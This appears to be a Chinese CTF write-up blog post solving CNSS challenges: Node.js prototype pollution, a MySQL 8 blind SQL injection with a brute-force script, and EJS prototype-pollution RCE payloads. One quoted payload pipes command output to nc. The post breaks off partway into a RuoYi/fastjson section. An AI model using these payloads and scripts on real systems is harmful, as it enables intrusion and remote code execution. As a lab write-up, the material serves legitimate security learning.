EzPollution_pre</h2><p>嘿嘿，原型链，nodejs太好玩了</p><p>之前没接触过，开搜</p><blockquote><p>上资料：</p><ul><li><a href="https://juejin.cn/post/6984678359275929637">一文搞懂JS原型与原型链（超详细，建议收藏） - 掘金 (juejin.cn)</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链 - JavaScript | MDN (mozilla.org)</a></li></ul></blockquote><p>简单了解了一下，</p><blockquote><p>现在我们知道了，当访问一个<code>对象</code>的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会通过它的<code>__proto__</code>隐式属性，找到它的<code>构造函数</code>的<code>原型对象</code>，如果还没有找到就会再在其<code>构造函数</code>的<code>prototype</code>的<code>__proto__</code>中查找，这样一层一层向上查找就会形成一个链式结构，我们称为<code>原型链</code>。</p></blockquote><p>看文字好像有点抽象，我们来try try看</p><p><img src="/posts/43716/image-20231019175923135.png" alt="image-20231019175923135"></p><p>可以看到a一直都是个空对象</p><p>但是我们通过增加继承关系mm</p><blockquote><p>当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。</p></blockquote><p>所以a.mm返回了原型上的属性</p><p>贴一下源码</p><p><strong>login.js</strong></p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>()<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>)<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">value</span>) &#123;<br>  <span class="hljs-keyword">const</span> blacklistRegex = <span class="hljs-regexp">/(exec|load)/i</span><br>  <span class="hljs-keyword">if</span> (blacklistRegex.<span class="hljs-title function_">test</span>(value)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-comment">/* GET home page.  */</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(), <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;<br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span><br>  <span class="hljs-keyword">let</span> user = &#123;&#125;<br>  utils.<span class="hljs-title function_">copy</span>(user, req.<span class="hljs-property">body</span>)<br>  <span class="hljs-keyword">if</span> (secert.<span class="hljs-property">psych</span> === <span class="hljs-string">&#x27;p5ych&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">waf</span>(secert.<span class="hljs-property">eva1</span>)) &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">seval</span>(secert.<span class="hljs-property">eva1</span>))<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;hehe,,&#x27;</span>)<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<br>      <span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>,<br>      <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user),<br>    &#125;)<br>  &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router<br><br></code></pre></td></tr></table></figure></blockquote><p>对于这题</p><ul><li>要使<code>secret.psych == &#39;p5ych&#39;</code>，但是secret是个空对象，所以就要用到原型链</li><li>但login.js中并没有明显的原型链操作，这时我们注意到<code>utils.copy(user, req.body)</code>，翻一下utils的源码</li></ul><p><strong>common.js</strong></p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">copy</span>:copy<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy</span>(<span class="hljs-params">object1, object2</span>)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> object2 &amp;&amp; key <span class="hljs-keyword">in</span> object1) &#123;<br>            <span class="hljs-title function_">copy</span>(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>观察copy函数，如果当<code>key</code>为<code>__proto__</code>时，是不是就完成了一次原型链污染，实践一下</p><p><img src="/posts/43716/image-20231019191410727.png" alt="image-20231019191410727"></p><p>发现污染成功，芜湖~~</p><p>接下来就比较简单了，因为<strong>一个环境只能污染一次</strong>，所以先本地运行一下试一下（<strong>记得搭一下nodejs环境</strong></p><p><img src="/posts/43716/image-20231019191600257.png" alt="image-20231019191600257"></p><p>打开BurpSuite抓包，点击登录</p><p><img src="/posts/43716/image-20231019220831796.png" alt="image-20231019220831796"></p><p>修改post参数，放行</p><p><img src="/posts/43716/image-20231019234339420.png" alt="image-20231019234339420"></p><p>得到回显</p><p><img src="/posts/43716/image-20231019234359250.png" alt="image-20231019234359250"></p><p><strong>需要注意的点</strong>：</p><ul><li>源码中过滤了<code>exec</code>和<code>load</code>，所以可以使用<code>+</code>逃过waf</li><li>这个回显的地方要慢慢调，好崩溃😒😒</li></ul><p>本地调好了，那就上环境，如法炮制一下，得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;v2ry_ea5y_N0dejs&#125;</code></font></center></strong></em></p><h2 id="Hard-📀-newsql"><a href="#Hard-📀-newsql" class="headerlink" title="[Hard] 📀 newsql"></a>[Hard] 📀 newsql</h2><p><del>我才不会告诉你这题我是手注的</del></p><p>如题sql注入，经过提示得到这是sql8.0的特性注入</p><p>资料：</p><blockquote><p><a href="https://blog.csdn.net/HBohan/article/details/119757059">【网安干货】MySQL8新特性注入技巧_mysql values row_IT老涵的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">【精选】Pwnhub2021七月赛NewSql（mysql8注入）_mysql8 注入 ctf_bfengj的博客-CSDN博客</a></p></blockquote><p>得知sql8.0多了<code>Table</code>和<code>Value</code>的语法</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]<br></code></pre></td></tr></table></figure><p>当然table也有几个比较奇怪的问题：</p><ul><li>符号比较（&lt;符号的问题，在爆最后一位时与前面不同</li><li>大小写问题（坑死我了，<strong>用binary’’来解决</strong></li><li>详情看资料</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mysql">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]<br>row_constructor_list:<br>    ROW(value_list)[，ROW(value_list)][，...]<br><br>value_list:<br>    value[，value][，...]<br><br>column_designator:<br>    column_index<br># 但这题我没用到value，不太懂具体用法<br></code></pre></td></tr></table></figure></blockquote><p>以及新的表<code>information_schema.TABLESPACES_EXTENSIONS</code></p><p><code>information_schema.TABLESPACES_EXTENSIONS</code>一次性储存了数据库名和表名</p><p>不多说，上手实操才是真理</p><p>输入<code>1 and 1=1 #</code>正常回显 </p><p>而<code>1 and 1=2 #</code>不回显</p><p>找到注入点，尝试<code>order by</code>，<code>union</code>，<code>select</code>发现都被过滤了</p><p>那就靠猜的吧</p><p><code>id=1 and (&#39;&#39;,&#39;&#39;)&lt;=(table information_schema.TABLESPACES_EXTENSIONS limit 0,1) #</code>时有回显，所以有两列</p><p>当时写完之后才想起来可以用脚本，头铁😢😢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//不如手注</span><br><br><span class="hljs-keyword">var</span> request = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sync-request&#x27;</span>)<br><span class="hljs-keyword">let</span> arr = []<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">45</span>; j &lt; <span class="hljs-number">126</span>; j++) &#123;<br>    arr[i] = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(j)<br>    <span class="hljs-comment">// console.log(arr.join(&#x27;&#x27;))</span><br>    <span class="hljs-comment">// url = `http://124.221.34.13:55553/?id=1 and (binary&#x27;$&#123;arr.join(&#x27;&#x27;)&#125;&#x27;,&#x27;&#x27;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 10,1) #`</span><br>    url = <span class="hljs-string">`http://124.221.34.13:55553/?id=1 and (&#x27;9&#x27;,binary&#x27;<span class="hljs-subst">$&#123;arr.join(</span></span><br><span class="hljs-subst"><span class="hljs-string">      <span class="hljs-string">&#x27;&#x27;</span></span></span><br><span class="hljs-subst"><span class="hljs-string">    )&#125;</span>&#x27;)&lt;(table cn55 limit 8,1) #`</span><br>    <span class="hljs-keyword">var</span> res = <span class="hljs-title function_">request</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, url, &#123;<br>      <span class="hljs-attr">timeout</span>: <span class="hljs-number">3000</span>,<br>    &#125;)<br>    <span class="hljs-comment">//console.log(String.fromCharCode(j - 1))</span><br>    arr[i] = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (<br>      !res.<span class="hljs-title function_">getBody</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>).<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;psych&#x27;</span>) &amp;&amp;<br>      !res.<span class="hljs-title function_">getBody</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>).<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>) &amp;&amp;<br>      j != <span class="hljs-number">92</span><br>    ) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i, <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(j - <span class="hljs-number">1</span>))<br>      arr[i] = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(j - <span class="hljs-number">1</span>)<br>      <span class="hljs-keyword">break</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!arr[i]) &#123;<br>    arr[i - <span class="hljs-number">1</span>] = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(arr[i - <span class="hljs-number">1</span>].<span class="hljs-title function_">charCodeAt</span>() + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">break</span><br>  &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>一个个试过去</p><p><code>?id=1 and (binary&#39;$&#123;arr.join(&#39;&#39;)&#125;&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 10,1) #</code></p><p>库&#x2F;表</p><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">mysql</td></tr><tr><td align="center">2</td><td align="center">innodb_system</td></tr><tr><td align="center">3</td><td align="center">innodb_temporary</td></tr><tr><td align="center">4</td><td align="center">innodb_undo_001</td></tr><tr><td align="center">5</td><td align="center">innodb_undo_002</td></tr><tr><td align="center">6</td><td align="center">sys&#x2F;sys_config</td></tr><tr><td align="center">7</td><td align="center">cnss&#x2F;users</td></tr><tr><td align="center">8</td><td align="center">cnss&#x2F;cn55</td></tr><tr><td align="center">9</td><td align="center">cnss&#x2F;uagents</td></tr><tr><td align="center">10</td><td align="center">cnss&#x2F;referers</td></tr></tbody></table><p>可以猜到flag应该在cnss&#x2F;cn55中</p><p><code>http://124.221.34.13:55553/?id=1 and (&#39;9&#39;,binary&#39;$&#123;arr.join(&#39;&#39;)&#125;&#39;)&lt;(table cn55 limit 8,1) #</code></p><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><a href="mailto:&#x44;&#117;&#109;&#x62;&#64;&#100;&#x68;&#x61;&#x6b;&#x6b;&#97;&#110;&#46;&#99;&#111;&#x6d;">&#x44;&#117;&#109;&#x62;&#64;&#100;&#x68;&#x61;&#x6b;&#x6b;&#97;&#110;&#46;&#99;&#111;&#x6d;</a></td></tr><tr><td align="center">2</td><td align="center"><a href="mailto:&#65;&#110;&#103;&#x65;&#108;&#x40;&#105;&#108;&#x6f;&#x76;&#101;&#x75;&#x2e;&#x63;&#111;&#x6d;">&#65;&#110;&#103;&#x65;&#108;&#x40;&#105;&#108;&#x6f;&#x76;&#101;&#x75;&#x2e;&#x63;&#111;&#x6d;</a></td></tr><tr><td align="center">3</td><td align="center"><a href="mailto:&#x44;&#x75;&#109;&#109;&#121;&#64;&#x64;&#x68;&#x61;&#x6b;&#107;&#97;&#x6e;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#108;">&#x44;&#x75;&#109;&#109;&#121;&#64;&#x64;&#x68;&#x61;&#x6b;&#107;&#97;&#x6e;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#108;</a></td></tr><tr><td align="center">4</td><td align="center"><a href="mailto:&#115;&#101;&#99;&#117;&#114;&#101;&#64;&#100;&#x68;&#x61;&#x6b;&#x6b;&#97;&#110;&#x2e;&#108;&#x6f;&#99;&#97;&#108;">&#115;&#101;&#99;&#117;&#114;&#101;&#64;&#100;&#x68;&#x61;&#x6b;&#x6b;&#97;&#110;&#x2e;&#108;&#x6f;&#99;&#97;&#108;</a></td></tr><tr><td align="center">5</td><td align="center"><a href="mailto:&#115;&#116;&#117;&#x70;&#x69;&#x64;&#64;&#100;&#x68;&#97;&#107;&#107;&#x61;&#x6e;&#46;&#108;&#x6f;&#99;&#x61;&#x6c;">&#115;&#116;&#117;&#x70;&#x69;&#x64;&#64;&#100;&#x68;&#97;&#107;&#107;&#x61;&#x6e;&#46;&#108;&#x6f;&#99;&#x61;&#x6c;</a></td></tr><tr><td align="center">6</td><td align="center"><a href="mailto:&#115;&#117;&#x70;&#101;&#114;&#109;&#x61;&#x6e;&#64;&#x64;&#104;&#x61;&#x6b;&#x6b;&#x61;&#x6e;&#46;&#108;&#x6f;&#x63;&#x61;&#x6c;">&#115;&#117;&#x70;&#101;&#114;&#109;&#x61;&#x6e;&#64;&#x64;&#104;&#x61;&#x6b;&#x6b;&#x61;&#x6e;&#46;&#108;&#x6f;&#x63;&#x61;&#x6c;</a></td></tr><tr><td align="center">7</td><td align="center"><a href="mailto:&#98;&#x61;&#116;&#x6d;&#97;&#110;&#x40;&#100;&#104;&#x61;&#x6b;&#x6b;&#x61;&#110;&#46;&#x6c;&#111;&#x63;&#x61;&#x6c;">&#98;&#x61;&#116;&#x6d;&#97;&#110;&#x40;&#100;&#104;&#x61;&#x6b;&#x6b;&#x61;&#110;&#46;&#x6c;&#111;&#x63;&#x61;&#x6c;</a></td></tr><tr><td align="center">8</td><td align="center">CNSS{1_want_t0_b2_b1ghacker}</td></tr></tbody></table><p>别问我为什么要全写出来，我闲的</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;1_want_t0_b2_b1ghacker&#125;</code></font></center></strong></em></p><h2 id="Hard-✴️-EzPollution"><a href="#Hard-✴️-EzPollution" class="headerlink" title="[Hard] ✴️ EzPollution"></a>[Hard] ✴️ EzPollution</h2><p>真的是太Ez啦（🤐🤐🤐</p><p>观察源码，是ejs</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;__dirname&#125;</span>/views/index.ejs`</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;CNSS Login&#x27;</span> &#125;);<br>&#125;)<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/login&quot;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> user = <span class="hljs-title function_">merge</span>(&#123;&#125;, req.<span class="hljs-property">query</span>)<br>    <span class="hljs-keyword">if</span> (user.<span class="hljs-property">username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; user.<span class="hljs-property">password</span> === <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Login success!&quot;</span><br>        &#125;)<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Login failed!&quot;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Not found!&quot;</span><br>    &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">err, req, res, next</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>)<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal server error!&quot;</span><br>    &#125;)<br>&#125;)<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">var</span> source = <span class="hljs-variable language_">arguments</span>[i]<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> source) &#123;<br>            <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (hasOwnProperty.<span class="hljs-title function_">call</span>(source, key)) &#123;<br>                <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>                    <span class="hljs-title function_">merge</span>(target[key], source[key])<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    target[key] = source[key]<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> target<br>&#125;<br><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">5000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;http://%s:%s&quot;</span>, host, port)<br>&#125;);<br><br></code></pre></td></tr></table></figure><ul><li>可以看到<code>/login</code>中用的是Get请求</li></ul><p>这其实是卡我最久的地方🫥🫥🫥</p><p>不断尝试发现直接<code>a[b][c]=111</code>就行了，太痛了谁懂</p><p><img src="/posts/43716/image-20231020221007760.png" alt="image-20231020221007760"></p><ul><li>其次<code>merge</code>函数过滤了<code>__proto__</code>，所以要换个方法</li></ul><blockquote><p>根据hint：<a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce">EJS - Server Side Prototype Pollution gadgets to RCE | mizu.re</a></p></blockquote><p>可以看到ejs有个注入点</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;id | nc localhost 4444&#x27;)&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>但是hint中也是用的<code>__proto__</code>，于是乎开搜</p><blockquote><p><a href="https://juejin.cn/post/6963950629240733727">前端原型链污染漏洞竟可以拿下服务器shell？ - 掘金 (juejin.cn)</a></p></blockquote><p>发现<code>&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;&#125;</code>一样可以污染原型链</p><p>那后面就简单了</p><p>构造</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">constructor<span class="hljs-punctuation">[</span>prototype<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>client<span class="hljs-punctuation">]</span>=<span class="hljs-literal"><span class="hljs-keyword">true</span></span>&amp;constructor<span class="hljs-punctuation">[</span>prototype<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>escapeFunction<span class="hljs-punctuation">]</span>=<span class="hljs-number">1</span>; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)<br></code></pre></td></tr></table></figure><p>注意这里的return，我找了很久的回显方式，发现当攻击完之后，在访问一次初始网页，就会自动下载命令执行结果</p><p>原理我猜测是</p><blockquote><p><del>当用escapeFn截断原始命令时<code>return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;whoami&#39;)</code>就成了单独的一条命令</del></p><p><del>当再次访问登录界面时，会complie被污染的escapeFn使语句执行，也就会自动下载命令执行结果</del></p></blockquote><p>试过反弹shell，似乎不行（泪流满面</p><p>不确定哈。。</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;JavaScr1pt_is_4w3s0m33333&#125;</code></font></center></strong></em></p><h2 id="Hard-🥇-ruoyi-with-fastjson"><a href="#Hard-🥇-ruoyi-with-fastjson" class="headerlink" title="[Hard+] 🥇 ruoyi with fastjson"></a>[Hard+] 🥇 ruoyi with fastjson</h2><blockquote><p>Hint:</p><ul><li>环境10分钟重置一次, 请不要故意破坏环境或泄露flag, <strong>所有流量都将会被记录</strong></li><li>任意文件读取 –&gt;flag part 1</li><li>想办法从&#x2F;proc搞到jar包在哪</li><li>逆向jar包 –&gt;flag part 2</li><li>找fastjson反序列化点，搞定payload的加密解密</li><li>getshell –&gt;flag part 3</li><li>一些可能有用的项目及工具东西：<br><code>https://github.com/welk1n/JNDI-Injection-Exploit</code><br><code>https://github.com/WhiteHSBG/JNDIExploit</code><br><code>https://github.com/pen4uin/java-memshell-generator-release</code><br><code>https://xz.aliyun.com/t/12492</code><br><code>https://xz.aliyun.com/search?keyword=fastjson</code></li></ul><p>没有公网地址，可以考虑frp，例如<code>https://www.natfrp.com/</code>，或者内存马等，可以参考提供的链接2、3、4</p></blockquote><p>ruoyi版本为4.7.6</p><blockquote><p><a href="https://www.cnblogs.com/shaoqiblog/p/17305315.html">若依 4.7.6 版本 任意文件下载漏洞（审计复现） - Tanya203 - 博客园 (cnblogs.com)</a></p><p><a href="https://mp.weixin.qq.com/s/IrqLp2Z3c941NiN0fFcDMA">【<em>最新漏洞复现</em>】 RuoYi 任意文件下载漏洞 (qq.com)</a></p></blockquote><p>搜索得到漏洞为<strong>任意文件下载</strong></p><p>根据复现方法try try</p><h3 id="Flag-Part-1"><a href="#Flag-Part-1" class="headerlink" title="Flag Part 1"></a>Flag Part 1</h3><blockquote><p><strong>系统监控–&gt;定时任务</strong></p><p><img src="/posts/43716/image-20231020225955850.png" 